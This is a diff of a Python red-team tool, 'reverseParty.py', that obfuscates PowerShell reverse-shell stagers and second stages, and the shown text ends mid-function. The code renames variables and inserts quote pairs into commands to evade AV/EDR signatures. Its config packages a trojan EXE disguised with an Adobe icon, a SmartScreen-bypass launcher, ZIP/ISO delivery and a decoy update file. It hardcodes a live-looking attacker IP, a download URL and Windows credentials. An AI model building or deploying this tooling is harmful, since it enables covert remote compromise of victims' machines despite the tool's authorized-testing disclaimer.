@@ -1,400 +1,783 @@
 #!/usr/bin/env python3
 """
-reverseParty.py - PowerShell reverse shell obfuscation tool
-Obfuscates stagers and second-stage payloads for red team operations.
+reverseParty.py - Reverse Shell Generation and Obfuscation Tool
+================================================================
+This script automates the creation of obfuscated reverse shells and stagers
+for authorized penetration testing and red team operations.
+
+DISCLAIMER: This tool is intended for authorized security testing only.
+Unauthorized use against systems you do not own or have explicit permission
+to test is illegal and unethical.
+
+Directory structure expected:
+  reverseParty/
+  ├── reverseParty.py         (this script)
+  └── engine/
+      ├── powershell-cmd/
+      │   ├── powershell-cmd.txt              (all PowerShell commands)
+      │   └── powershell-cmd-noParametri.txt  (PS commands without params)
+      ├── second-stage/        (clear-text reverse shell files)
+      ├── stager/              (clear-text stager files)
+      ├── out/                 (output - gets cleared each run)
+      ├── stuff/               (support files: LAUNCHERNAME etc.)
+      └── listener/            (listener scripts)
+
+Dependencies:
+    pip install pywinrm
 """
 
-import sys
 import os
+import sys
 import re
 import uuid
 import random
 import shutil
-import argparse
+import base64
 
-# ─── Base paths ─────────────────────────────────────────────────────────────
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-ENGINE_DIR = os.path.join(SCRIPT_DIR, "engine")
+# Optional WinRM dependency - imported lazily in step 4
+try:
+    import winrm
+    WINRM_AVAILABLE = True
+except ImportError:
+    WINRM_AVAILABLE = False
+
+
+# ==============================================================================
+# VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
+# ==============================================================================
+
+# LHOST - Public IP address to receive the reverse shell callback
+# Example: "192.168.1.11"  or  "10.0.0.1"  or  "203.0.113.42"
+LHOST = "151.61.206.201"
+
+# LPORT - Port number to listen on for incoming reverse shell connections
+# Example: "9001"  or  "4444"  or  "443"
+LPORT = "9001"
+
+# ATTACKER_URL - Base URL from which second-stage, backdoor zip and ISO
+# will be downloaded by the victim machine
+# Example: "http://192.168.1.11"  or  "http://myDomain.com/stuff"
+ATTACKER_URL = "http://151.61.206.201"
+
+# SECONDNAME - Filename for the second-stage payload on the attacker server
+# Example: "second.txt"  or  "update.dat"
+SECONDNAME = "second.txt"
+
+# STAGERNAME - Filename for the stager script on the attacker server
+# Example: "stager.txt"  or  "init.dat"
+STAGERNAME = "stager.txt"
+
+# LAUNCHERNAME - Trusted Windows binary / launcher file used to bypass SmartScreen
+# Example: "launcher.bat"  or  "setup.bat"
+LAUNCHERNAME = "launcher.bat"
+
+# EXENAME - Name of the stager/trojan compiled as an executable (run by LAUNCHERNAME)
+# Example: "ps2pdf.exe"  or  "adobeupdate.exe"
+EXENAME = "ps2pdf.exe"
+
+# ZIPNAME - Name of the ZIP archive containing launcher + stager EXE
+# Example: "postscript.zip"  or  "adobeCC.zip"
+ZIPNAME = "postscript.zip"
+
+# ISONAME - Name of the ISO image containing the launcher and trojan zip
+# Example: "setup.iso"  or  "AdobeCC_2024.iso"
+ISONAME = "setup.iso"
+
+# WIN_IP - IP address of the Windows machine used to compile PS1 scripts to EXE
+# Example: "192.168.1.10"
+WIN_IP = "192.168.1.111"
+
+# WIN_USER - Username to authenticate to the Windows machine
+# Example: "administrator"  or  "user"
+WIN_USER = "ieuser"
+
+# WIN_PASS - Password to authenticate to the Windows machine
+# Example: "MyP@ssw0rd"
+WIN_PASS = "Passw0rd!"
+
+# TROJAN_FE - Decoy front-end file displayed to victim after the backdoor installs
+# Example: "update_k897867.msu"  or  "image.jpg"
+TROJAN_FE = "update_k897867.msu"
+
+# ICONNAME - ICO file used to make the trojan EXE look convincing
+# Example: "adobe.ico"  or  "windows_update.ico"
+ICONNAME = "adobe.ico"
+
+# TROJANNAME - PS1 script defining trojan behavior (downloads backdoor + launches TROJAN_FE)
+# Example: "installer.ps1"  or  "update.ps1"
+TROJANNAME = "installer.ps1"
+
+# TROJAN_URL - URL from which to download the trojan PS1 script
+# Example: "https://raw.githubusercontent.com/user/repo/main/privateFolder"
+TROJAN_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+
+# ==============================================================================
+# END OF USER-CONFIGURABLE VARIABLES
+# ==============================================================================
+
+
+# --- ANSI color codes for terminal output ---
+RED_DARK = "\033[31m"
+YELLOW   = "\033[33m"
+GREEN    = "\033[32m"
+RESET    = "\033[0m"
+
+# --- Path definitions (relative to the script location) ---
+SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
+ENGINE_DIR       = os.path.join(SCRIPT_DIR, "engine")
+OUT_DIR          = os.path.join(ENGINE_DIR, "out")
 SECOND_STAGE_DIR = os.path.join(ENGINE_DIR, "second-stage")
-STAGER_DIR = os.path.join(ENGINE_DIR, "stager")
-OUT_DIR = os.path.join(ENGINE_DIR, "out")
-PS_CMD_FILE = os.path.join(ENGINE_DIR, "powershell-cmd", "powershell-cmd.txt")
-PS_CMD_NO_PARAM_FILE = os.path.join(ENGINE_DIR, "powershell-cmd", "powershell-cmd-noParametri.txt")
+STAGER_DIR       = os.path.join(ENGINE_DIR, "stager")
+STUFF_DIR        = os.path.join(ENGINE_DIR, "stuff")
+LISTENER_DIR     = os.path.join(ENGINE_DIR, "listener")
+PS_CMD_DIR       = os.path.join(ENGINE_DIR, "powershell-cmd")
+PS_CMD_FILE      = os.path.join(PS_CMD_DIR, "powershell-cmd.txt")
+PS_CMD_NOPARAM   = os.path.join(PS_CMD_DIR, "powershell-cmd-noParametri.txt")
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  UTILITY FUNCTIONS
-# ════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+# UTILITY FUNCTIONS
+# ==============================================================================
 
-def generate_random_var_names(count: int = 50) -> list:
-    """Generate a pool of random hex variable names using uuid4."""
-    return [uuid.uuid4().hex for _ in range(count)]
+def banner():
+    print("=" * 70)
+    print("  reverseParty.py — Reverse Shell Obfuscation Tool")
+    print("  For authorized penetration testing use only.")
+    print("=" * 70)
+    print()
 
+def section(title: str):
+    print()
+    print("─" * 70)
+    print(f"  {title}")
+    print("─" * 70)
 
-def load_lines(filepath: str) -> list:
-    """Read a file and return stripped, non-empty lines."""
-    with open(filepath, "r", encoding="utf-8") as fh:
-        return [line.strip() for line in fh if line.strip()]
+def info(msg: str):
+    print(f"  [*] {msg}")
 
+def ok(msg: str):
+    print(f"  {GREEN}[+]{RESET} {msg}")
 
-def obfuscate_variables(content: str, var_pool: list) -> str:
+def warn(msg: str):
+    print(f"  {YELLOW}[!]{RESET} {msg}")
+
+def err(msg: str):
+    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")
+    sys.exit(1)
+
+def err_nonfatal(msg: str):
+    print(f"  {RED_DARK}[ERROR] {msg}{RESET}")
+
+def generate_hex_pool(count: int = 80) -> list:
     """
-    Find all PowerShell variable assignments ($name=) in content and replace
-    them with random hex names. Environment variables are left intact.
-
-    Rules:
-      - Must start with '$'
-      - Must end with '='
-      - The bare word without '$' and '=' is NOT replaced.
+    Generate a pool of unique UUID4 hex strings.
+    Used as random replacement names for PowerShell variables.
+    Each call to uuid.uuid4().hex produces a 32-char hex string from a
+    cryptographically random UUID, guaranteeing high entropy and uniqueness.
     """
-    # Find all unique variable names matching $word= pattern
-    # Exclude environment variables: they are typically all-uppercase and
-    # do not appear as assignment targets in the script body. We use a
-    # heuristic: if the token matches an environment variable pattern
-    # (all uppercase letters/digits/underscore) we skip it.
+    pool = []
+    seen = set()
+    while len(pool) < count:
+        h = uuid.uuid4().hex
+        if h not in seen:
+            seen.add(h)
+            pool.append(h)
+    return pool
+
+def read_file(path: str) -> str:
+    with open(path, "r", encoding="utf-8", errors="replace") as f:
+        return f.read()
+
+def write_file(path: str, content: str):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(content)
+
+
+# ==============================================================================
+# OBFUSCATION — PASS 1: Variable renaming
+# ==============================================================================
+
+def obfuscate_variables(content: str, hex_pool: list, used_hex: set) -> tuple:
+    """
+    Obfuscation Pass 1 — Rename user-defined PowerShell variables.
+
+    Scans the content for all variable ASSIGNMENT patterns of the exact form:
+        $varname=
+    where:
+      - The name starts with $ followed immediately by a letter or underscore.
+      - The name ends with = (with optional spaces before it).
+      - The name contains NO colon — this safely excludes environment variables
+        such as $env:PATH, $PSVersionTable, etc.
+
+    Each unique variable found is mapped to one UUID hex token from the pool.
+    That token then replaces EVERY occurrence of the variable throughout the
+    file — both at the assignment site ($name = ...) and at all usage sites
+    ($name).
+
+    Key rules:
+      - Only $name= is targeted.  name= and $name alone are NOT touched.
+      - Each hex token is used for exactly one variable (no reuse).
+      - Replacement is whole-word safe: $myVar won't match inside $myVarLong.
+
+    Example:
+        $url = "http://..."   →   $3f8ab2c1...= "http://..."
+        IEX $url              →   IEX $3f8ab2c1...
+
+    Args:
+        content:  Full PowerShell file text.
+        hex_pool: Pre-generated list of unique hex tokens.
+        used_hex: Set of already-consumed tokens (modified in-place).
+
+    Returns:
+        (obfuscated_content, mapping_dict)
+    """
+    # Match $varname= — colon excluded from name → env vars are safe
     pattern = re.compile(r'\$([A-Za-z_][A-Za-z0-9_]*)\s*=')
-    found_vars = list(dict.fromkeys(pattern.findall(content)))  # preserve order, unique
+    var_names = set(pattern.findall(content))
 
-    # Filter out likely environment variable names (all uppercase)
-    def is_env_var(name: str) -> bool:
-        return name.isupper()
-
-    replaceable = [v for v in found_vars if not is_env_var(v)]
-
-    var_pool_iter = iter(var_pool)
     mapping = {}
-    for var in replaceable:
-        try:
-            mapping[var] = next(var_pool_iter)
-        except StopIteration:
-            # Replenish pool if exhausted
-            mapping[var] = uuid.uuid4().hex
+    for var_name in sorted(var_names):
+        available = [h for h in hex_pool if h not in used_hex]
+        if not available:
+            for h in generate_hex_pool(80):
+                if h not in used_hex:
+                    available.append(h)
+        chosen = available[0]
+        used_hex.add(chosen)
+        mapping[var_name] = chosen
 
-    # Replace occurrences – longer names first to avoid partial replacements
-    for original in sorted(mapping.keys(), key=len, reverse=True):
-        replacement = mapping[original]
-        # Replace $original= (with optional whitespace before =)
+    # Replace every occurrence: both assignments ($name =) and usages ($name)
+    # The negative lookahead ensures we don't match substrings of longer names
+    for var_name, hex_name in mapping.items():
         content = re.sub(
-            r'\$' + re.escape(original) + r'(\s*=)',
-            '$' + replacement + r'\1',
-            content
-        )
-        # Also replace bare usages of $original (without =) that were renamed
-        content = re.sub(
-            r'\$' + re.escape(original) + r'\b',
-            '$' + replacement,
+            r'\$' + re.escape(var_name) + r'(?=[^A-Za-z0-9_]|$)',
+            '$' + hex_name,
             content
         )
 
-    return content
+    return content, mapping
 
 
-def method1_obfuscate(cmd: str) -> str:
+# ==============================================================================
+# OBFUSCATION — PASS 2: PowerShell command quote injection (Method 1)
+# ==============================================================================
+
+def _insert_junk_between_chars(word: str) -> str:
     """
-    Method1: Insert single ('') or double ("") quote pairs between letters.
-    At most ONE pair between any two consecutive characters.
-    Number of insertions is random (1 up to len(cmd)).
+    Method 1 — Insert empty-string pairs between characters of a PS command.
+
+    PowerShell parses  wh''oam''i  identically to  whoami  because the empty
+    strings are concatenated at parse time with zero effect on execution.
+    This breaks character-sequence-based AV/EDR signatures without altering
+    the functional meaning of the command.
+
+    Algorithm:
+      1. Choose a random number of insertion points: min=1, max=len(word)-1.
+      2. Select that many random gap positions between adjacent characters.
+      3. At each selected gap, insert either '' or "" chosen at random.
+
+    Hard constraints enforced:
+      - At most ONE separator per gap between two letters.
+        → who''''ami is INVALID (two separators in the same gap).
+        → wh""''oami is INVALID (two different separators in the same gap).
+      - A separator is exactly '' (two single-quotes) OR "" (two double-quotes).
+      - At least one separator is always inserted.
+
+    Valid example:   whoami  →  w''ho""am''i
+    Invalid example: who''''ami   (double separator in one gap — forbidden)
+
+    Args:
+        word: A single PS command token string (e.g. "whoami").
+
+    Returns:
+        The token with quote pairs injected between random character pairs.
     """
-    if len(cmd) < 2:
-        return cmd
+    if len(word) <= 1:
+        return word
 
-    chars = list(cmd)
-    max_insertions = len(cmd)
-    num_insertions = random.randint(1, max_insertions)
+    separators = ["''", '""']
+    chars = list(word)
+    max_insertions = len(chars) - 1
+    n_insertions = random.randint(1, max_insertions)
 
-    # Choose random positions between characters (indexes 1..len-1)
-    positions = sorted(random.sample(range(1, len(chars)), min(num_insertions, len(chars) - 1)))
+    gap_indices = list(range(max_insertions))
+    insert_positions = set(random.sample(gap_indices, n_insertions))
 
-    result = []
-    for i, ch in enumerate(chars):
-        result.append(ch)
-        if i + 1 in positions:
-            result.append(random.choice(["''", '""']))
+    result = [chars[0]]
+    for i in range(len(chars) - 1):
+        if i in insert_positions:
+            # Insert exactly ONE separator ('' or "") — never two in the same gap
+            result.append(random.choice(separators))
+        result.append(chars[i + 1])
 
     return "".join(result)
 
 
-def method_a_obfuscate(cmd: str) -> str:
-    """
-    MethodA: ('','c','h','a','r'... -join'')|i''e''x
-    """
-    chars = "','".join(list(cmd))
-    return f"('','{chars}' -join'')|i''e''x"
-
-
-def method_b_obfuscate(cmd: str) -> str:
-    """
-    MethodB: $a=@('c','h','a','r'...);i''ex ($a-join'')
-    """
-    chars = "','".join(list(cmd))
-    return f"$a=@('{chars}');i''ex ($a-join'')"
-
-
-def method_c_obfuscate(cmd: str) -> str:
-    """
-    MethodC: $h='first_half';$t='second_half';i''e""x ($h+$t)
-    """
-    mid = len(cmd) // 2
-    first = cmd[:mid]
-    second = cmd[mid:]
-    return f"$h='{first}';$t='{second}';i''e\"\"x ($h+$t)"
-
-
 def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
     """
-    Obfuscate PowerShell commands listed in ps_cmd_file using Method1.
-    Commands are matched longest-first.
-    Commands starting with '.' are skipped.
-    Only the command token is modified; surrounding text is preserved.
+    Obfuscation Pass 2 — Apply Method 1 to known PowerShell command tokens.
+
+    Reads the command list from ps_cmd_file, then for every command that
+    appears as a whole token in the content, applies _insert_junk_between_chars.
+
+    Matching rules:
+      - Commands are sorted longest-first before matching.
+        This prevents a shorter command (e.g. "ls") from being matched
+        inside a longer one (e.g. "cls") that was already processed.
+      - Only whole-word token matches are replaced (word-boundary safe regex).
+      - Commands whose first character is '.' or ':' are skipped entirely.
+      - Matching is case-insensitive (PowerShell is case-insensitive).
+      - ONLY the matched token is replaced; all surrounding text is untouched.
+
+    Args:
+        content:     Full text of the PowerShell file.
+        ps_cmd_file: Path to powershell-cmd.txt.
+
+    Returns:
+        Content with PS command tokens obfuscated via Method 1.
     """
-    commands = load_lines(ps_cmd_file)
-    # Sort by length descending to match longer commands first
-    commands.sort(key=len, reverse=True)
+    if not os.path.isfile(ps_cmd_file):
+        warn(f"PS command list not found: {ps_cmd_file} — skipping pass 2.")
+        return content
+
+    raw = read_file(ps_cmd_file).splitlines()
+    commands = [c.strip() for c in raw if c.strip()]
+    commands.sort(key=len, reverse=True)  # longest first
 
     for cmd in commands:
-        if cmd.startswith('.'):
+        # Skip commands that start with '.' or ':' or '('
+        if cmd.startswith('.') or cmd.startswith(':') or cmd.startswith('('):
             continue
-        # Match the command as a whole word (case-insensitive for PS)
-        pattern = re.compile(r'(?<![.\w])(' + re.escape(cmd) + r')(?!\w)', re.IGNORECASE)
 
-        def replacer(m):
-            return method1_obfuscate(m.group(1))
+        # Word-boundary pattern: not preceded or followed by identifier chars: . : (
+        pattern = re.compile(
+            r'(?<![.\:\(\$A-Za-z0-9_])' + re.escape(cmd) + r'(?![A-Za-z0-9_])',
+            re.IGNORECASE
+        )
+
+        def replacer(match):
+            # Preserve the original casing of the matched token
+            return _insert_junk_between_chars(match.group(0))
 
         content = pattern.sub(replacer, content)
 
     return content
 
 
-def obfuscate_ps_no_param_commands(content: str, ps_no_param_file: str) -> str:
+# ==============================================================================
+# OBFUSCATION PIPELINE — 2 passes only (variable rename + quote injection)
+# ==============================================================================
+
+def full_obfuscation_pipeline(content: str, label: str) -> str:
     """
-    Obfuscate PowerShell no-parameter commands using a randomly chosen method
-    (A, B, or C) per command occurrence.
+    Run the two safe obfuscation passes on the given PowerShell content.
+
+    Only two passes are applied to guarantee the output remains fully
+    functional PowerShell code:
+
+      Pass 1 — Variable renaming:
+        Every user-defined variable assignment pattern  $name=  is found.
+        Each unique variable name is replaced with a UUID hex token throughout
+        the entire file (both assignment and all usage sites).
+        Environment variables ($env:X, etc.) are left completely untouched.
+        No two variables share the same hex token.
+
+      Pass 2 — PS command quote injection (Method 1):
+        Known PowerShell command tokens (from powershell-cmd.txt) are located
+        in the content using longest-first, case-insensitive, whole-word
+        matching. Each matched token has '' or "" pairs inserted between
+        random pairs of adjacent characters — at most one separator per gap.
+        Commands starting with '.' or ':' are excluded.
+        Only the token itself is modified; all surrounding text is unchanged.
+
+    No other transformations are applied. Passes that modify string literals,
+    split cmdlet names, or encode content (Base64 etc.) are intentionally
+    excluded as they break PowerShell syntax in practice.
+
+    Args:
+        content: Raw PowerShell content (after placeholder substitution).
+        label:   Short label for log output (e.g. "second-stage", "stager").
+
+    Returns:
+        Obfuscated PowerShell content safe to execute.
     """
-    commands = load_lines(ps_no_param_file)
-    commands.sort(key=len, reverse=True)
+    hex_pool = generate_hex_pool(120)
+    used_hex = set()
 
-    methods = [method_a_obfuscate, method_b_obfuscate, method_c_obfuscate]
+    # ── Pass 1: Variable renaming ────────────────────────────────────────────
+    info(f"  [{label}] Pass 1: Renaming user-defined variables with UUID hex tokens...")
+    content, var_map = obfuscate_variables(content, hex_pool, used_hex)
+    if var_map:
+        ok(f"  [{label}] Renamed {len(var_map)} variable(s):")
+        for orig, new in var_map.items():
+            print(f"             ${orig}  →  ${new}")
+    else:
+        info(f"  [{label}] No assignable user-defined variables found.")
 
-    for cmd in commands:
-        if cmd.startswith('.'):
-            continue
-        pattern = re.compile(r'(?<![.\w])(' + re.escape(cmd) + r')(?!\w)', re.IGNORECASE)
-
-        def replacer(m, _cmd=cmd):
-            chosen = random.choice(methods)
-            return chosen(_cmd)
-
-        content = pattern.sub(replacer, content)
+    # ── Pass 2: PS command quote injection (Method 1) ────────────────────────
+    info(f"  [{label}] Pass 2: Obfuscating PS command tokens (Method 1 — quote injection)...")
+    before = content
+    content = obfuscate_ps_commands(content, PS_CMD_FILE)
+    if content != before:
+        ok(f"  [{label}] PS command tokens obfuscated with '' / \"\" insertions.")
+    else:
+        info(f"  [{label}] No matching PS command tokens found for quote injection.")
 
     return content
 
 
-def full_obfuscation(content: str, ps_cmd_file: str, ps_no_param_file: str) -> str:
+# ==============================================================================
+# STEP 1 — VARIABLE VALIDATION
+# ==============================================================================
+
+def step1_validate_variables():
     """
-    Apply the full obfuscation pipeline to a file's content:
-      1. Randomise variable names.
-      2. Obfuscate PowerShell commands (Method1).
-      3. Obfuscate no-parameter commands (random method A/B/C).
+    STEP 1: Validate all required configuration variables.
+
+    Checks that every user-configurable variable defined at the top of the
+    script is non-empty. All variable names and current values are printed
+    so the operator can visually confirm correctness before proceeding.
+
+    If any variable is blank the script aborts immediately with an error.
+    No partial runs are permitted.
     """
-    var_pool = generate_random_var_names(100)
-    content = obfuscate_variables(content, var_pool)
-    content = obfuscate_ps_commands(content, ps_cmd_file)
-    content = obfuscate_ps_no_param_commands(content, ps_no_param_file)
-    return content
+    section("STEP 1 — Variable Validation")
+    info("Checking that all required configuration variables are set...")
+    info("The following values will be used during this run:")
+    print()
+
+    variables = {
+        "LHOST":        LHOST,
+        "LPORT":        LPORT,
+        "ATTACKER_URL": ATTACKER_URL,
+        "SECONDNAME":   SECONDNAME,
+        "STAGERNAME":   STAGERNAME,
+        "LAUNCHERNAME": LAUNCHERNAME,
+        "EXENAME":      EXENAME,
+        "ZIPNAME":      ZIPNAME,
+        "ISONAME":      ISONAME,
+        "WIN_IP":       WIN_IP,
+        "WIN_USER":     WIN_USER,
+        "WIN_PASS":     WIN_PASS,
+        "TROJAN_FE":    TROJAN_FE,
+        "ICONNAME":     ICONNAME,
+        "TROJANNAME":   TROJANNAME,
+        "TROJAN_URL":   TROJAN_URL,
+    }
+
+    all_ok = True
+    max_len = max(len(k) for k in variables)
+
+    for var_name, var_value in variables.items():
+        padded = var_name.ljust(max_len)
+        if not var_value or var_value.strip() == "":
+            print(f"    {RED_DARK}{padded} = [NOT SET]  ← MISSING!{RESET}")
+            all_ok = False
+        else:
+            print(f"    {padded} = {var_value}")
+
+    print()
+    if not all_ok:
+        err("One or more required variables are not set. "
+            "Please edit the variables section at the top of the script.")
+
+    ok("All variables are set. Proceeding to Step 2...")
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  STEP 1 – PARAMETER VALIDATION
-# ════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+# STEP 2 — SECOND STAGE OBFUSCATION
+# ==============================================================================
 
-def step1_parse_args() -> argparse.Namespace:
-    print("=" * 70)
-    print("[STEP 1] Checking and validating input parameters...")
-    print("=" * 70)
+def step2_obfuscate_second_stage():
+    """
+    STEP 2: Select, configure, and obfuscate the second-stage reverse shell.
 
-    parser = argparse.ArgumentParser(
-        prog="reverseParty.py",
-        description="reverseParty – PowerShell reverse shell obfuscation tool",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Parameters description:
-  --lhost                Public IP to receive the reverse shell connection.
-  --lport                Port to listen on for the incoming reverse shell.
-  --attacker-url         Full URL from which the second-stage will be downloaded.
-  --attacker-second-stage  Filename of the second-stage to be fetched by the stager.
-  --win-ip               IP address of the Windows machine used to convert PS1 to EXE.
-  --win-user             Username for authenticating to the Windows machine.
-  --win-pass             Password for authenticating to the Windows machine.
+    Actions performed:
+      2a. Clear the entire /engine/out/ directory (clean slate for this run).
+      2b. Randomly select one file from /engine/second-stage/.
+          The selected filename is printed for the operator.
+      2c. Copy it to /engine/out/ as SECONDNAME.
+      2d. Substitute placeholders in the copied file:
+            [ATTACKER-IP]   →  LHOST
+            [ATTACKER-PORT] →  LPORT
+      2e. Apply the 2-pass obfuscation pipeline:
+            Pass 1 — variable renaming with UUID hex tokens
+            Pass 2 — PS command quote injection (Method 1)
+    """
+    section("STEP 2 — Second Stage Obfuscation")
 
-Example:
-  python reverseParty.py \\
-      --lhost 203.0.113.1 \\
-      --lport 9001 \\
-      --attacker-url http://192.168.1.11 \\
-      --attacker-second-stage second.txt \\
-      --win-ip 192.168.1.10 \\
-      --win-user user \\
-      --win-pass myPassword
-"""
-    )
-
-    parser.add_argument("--lhost", required=True,
-                        help="Public IP to receive the reverse shell (e.g. 203.0.113.1)")
-    parser.add_argument("--lport", required=True,
-                        help="Listening port for the reverse shell (e.g. 9001)")
-    parser.add_argument("--attacker-url", required=True, dest="attacker_url",
-                        help="URL to download second-stage from (e.g. http://192.168.1.11)")
-    parser.add_argument("--attacker-second-stage", required=True, dest="attacker_second_stage",
-                        help="Second-stage filename (e.g. second.txt)")
-    parser.add_argument("--win-ip", required=True, dest="win_ip",
-                        help="Windows machine IP for PS1→EXE conversion (e.g. 192.168.1.10)")
-    parser.add_argument("--win-user", required=True, dest="win_user",
-                        help="Username for the Windows machine")
-    parser.add_argument("--win-pass", required=True, dest="win_pass",
-                        help="Password for the Windows machine")
-
-    args = parser.parse_args()
-
-    print(f"  [+] LHOST                  : {args.lhost}")
-    print(f"  [+] LPORT                  : {args.lport}")
-    print(f"  [+] ATTACKER-URL           : {args.attacker_url}")
-    print(f"  [+] ATTACKER-SECOND-STAGE  : {args.attacker_second_stage}")
-    print(f"  [+] WIN-IP                 : {args.win_ip}")
-    print(f"  [+] WIN-USER               : {args.win_user}")
-    print(f"  [+] WIN-PASS               : {'*' * len(args.win_pass)}")
-    print("[STEP 1] All parameters validated successfully.\n")
-
-    return args
-
-
-# ════════════════════════════════════════════════════════════════════════════
-#  STEP 2 – SECOND-STAGE OBFUSCATION
-# ════════════════════════════════════════════════════════════════════════════
-
-def step2_obfuscate_second_stage(args: argparse.Namespace) -> None:
-    print("=" * 70)
-    print("[STEP 2] Obfuscating second-stage payload...")
-    print("=" * 70)
-
-    # 2a. Clear the output directory
-    print(f"  [*] Clearing output directory: {OUT_DIR}")
-    if os.path.exists(OUT_DIR):
+    # 2a. Clear out/
+    info("Clearing output directory: " + OUT_DIR)
+    if os.path.isdir(OUT_DIR):
         shutil.rmtree(OUT_DIR)
     os.makedirs(OUT_DIR, exist_ok=True)
-    print("  [+] Output directory cleared.")
+    ok("Output directory cleared and recreated successfully.")
 
-    # 2b. Pick a random second-stage file
-    second_stage_files = [
+    # 2b. Random selection from second-stage/
+    info("Scanning second-stage directory: " + SECOND_STAGE_DIR)
+    if not os.path.isdir(SECOND_STAGE_DIR):
+        err(f"Second-stage directory not found: {SECOND_STAGE_DIR}")
+
+    stage_files = [
         f for f in os.listdir(SECOND_STAGE_DIR)
         if os.path.isfile(os.path.join(SECOND_STAGE_DIR, f))
     ]
-    if not second_stage_files:
-        print("  [!] ERROR: No files found in the second-stage directory. Aborting.")
-        sys.exit(1)
+    if not stage_files:
+        err(f"No files found in second-stage directory: {SECOND_STAGE_DIR}")
 
-    chosen_file = random.choice(second_stage_files)
-    src_path = os.path.join(SECOND_STAGE_DIR, chosen_file)
-    print(f"  [+] Randomly selected second-stage file: {chosen_file}")
+    selected = random.choice(stage_files)
+    selected_path = os.path.join(SECOND_STAGE_DIR, selected)
+    ok(f"Randomly selected second-stage file: {selected}")
 
-    # 2c. Copy to out/ with the name provided by the parameter
-    dst_path = os.path.join(OUT_DIR, args.attacker_second_stage)
-    shutil.copy2(src_path, dst_path)
-    print(f"  [+] Copied to: {dst_path}")
+    # 2c. Copy to out/ as SECONDNAME
+    dest_path = os.path.join(OUT_DIR, SECONDNAME)
+    shutil.copy2(selected_path, dest_path)
+    ok(f"Copied to output directory as: {dest_path}")
 
-    # 2d. Read content and substitute placeholder variables
-    print("  [*] Replacing [ATTACKER-IP] and [ATTACKER-PORT] placeholders...")
-    with open(dst_path, "r", encoding="utf-8") as fh:
-        content = fh.read()
+    # 2d. Substitute placeholders
+    info("Substituting placeholders [ATTACKER-IP] and [ATTACKER-PORT]...")
+    content = read_file(dest_path)
+    n_ip   = content.count("[ATTACKER-IP]")
+    n_port = content.count("[ATTACKER-PORT]")
+    content = content.replace("[ATTACKER-IP]",   LHOST)
+    content = content.replace("[ATTACKER-PORT]", LPORT)
+    write_file(dest_path, content)
+    ok(f"Replaced {n_ip} occurrence(s) of [ATTACKER-IP]   → '{LHOST}'.")
+    ok(f"Replaced {n_port} occurrence(s) of [ATTACKER-PORT] → '{LPORT}'.")
 
-    content = content.replace("[ATTACKER-IP]", args.lhost)
-    content = content.replace("[ATTACKER-PORT]", args.lport)
-    print(f"       [ATTACKER-IP]   -> {args.lhost}")
-    print(f"       [ATTACKER-PORT] -> {args.lport}")
-
-    # 2e. Full obfuscation pipeline
-    print("  [*] Generating random variable name pool...")
-    print("  [*] Obfuscating variable names...")
-    print("  [*] Obfuscating PowerShell commands (Method1)...")
-    print("  [*] Obfuscating no-parameter commands (random method A/B/C)...")
-    content = full_obfuscation(content, PS_CMD_FILE, PS_CMD_NO_PARAM_FILE)
-
-    # 2f. Write obfuscated content back
-    with open(dst_path, "w", encoding="utf-8") as fh:
-        fh.write(content)
-
-    print(f"  [+] Obfuscated second-stage written to: {dst_path}")
-    print("[STEP 2] Second-stage obfuscation complete.\n")
+    # 2e. Obfuscation pipeline (2 passes)
+    info("Starting obfuscation pipeline (2 passes) on second-stage file...")
+    content = read_file(dest_path)
+    content = full_obfuscation_pipeline(content, label="second-stage")
+    write_file(dest_path, content)
+    ok(f"Second-stage obfuscation complete. Output: {dest_path}")
 
 
-# ════════════════════════════════════════════════════════════════════════════
-#  STEP 3 – STAGER OBFUSCATION
-# ════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+# STEP 3 — STAGER OBFUSCATION
+# ==============================================================================
 
-def step3_obfuscate_stager(args: argparse.Namespace) -> None:
-    print("=" * 70)
-    print("[STEP 3] Obfuscating stager...")
-    print("=" * 70)
+def step3_obfuscate_stager():
+    """
+    STEP 3: Select, configure, and obfuscate the stager.
 
-    # 3a. Pick a random stager file
+    Actions performed:
+      3a. Randomly select one file from /engine/stager/.
+          The selected filename is printed for the operator.
+      3b. Copy it to /engine/out/ as STAGERNAME.
+      3c. Substitute placeholders in the copied file:
+            [ATTACKER-URL] →  ATTACKER_URL
+            [SECONDNAME]   →  SECONDNAME
+      3d. Apply the 2-pass obfuscation pipeline:
+            Pass 1 — variable renaming with UUID hex tokens
+            Pass 2 — PS command quote injection (Method 1)
+    """
+    section("STEP 3 — Stager Obfuscation")
+
+    # 3a. Random selection from stager/
+    info("Scanning stager directory: " + STAGER_DIR)
+    if not os.path.isdir(STAGER_DIR):
+        err(f"Stager directory not found: {STAGER_DIR}")
+
     stager_files = [
         f for f in os.listdir(STAGER_DIR)
         if os.path.isfile(os.path.join(STAGER_DIR, f))
     ]
     if not stager_files:
-        print("  [!] ERROR: No files found in the stager directory. Aborting.")
-        sys.exit(1)
+        err(f"No files found in stager directory: {STAGER_DIR}")
 
-    chosen_file = random.choice(stager_files)
-    src_path = os.path.join(STAGER_DIR, chosen_file)
-    print(f"  [+] Randomly selected stager file: {chosen_file}")
+    selected = random.choice(stager_files)
+    selected_path = os.path.join(STAGER_DIR, selected)
+    ok(f"Randomly selected stager file: {selected}")
 
-    # 3b. Copy to out/ as stager.txt
-    dst_path = os.path.join(OUT_DIR, "stager.txt")
-    shutil.copy2(src_path, dst_path)
-    print(f"  [+] Copied to: {dst_path}")
+    # 3b. Copy to out/ as STAGERNAME
+    dest_path = os.path.join(OUT_DIR, STAGERNAME)
+    shutil.copy2(selected_path, dest_path)
+    ok(f"Copied to output directory as: {dest_path}")
 
-    # 3c. Read content and substitute placeholder variables
-    print("  [*] Replacing [ATTACKER-URL] and [ATTACKER-SECOND-STAGE] placeholders...")
-    with open(dst_path, "r", encoding="utf-8") as fh:
-        content = fh.read()
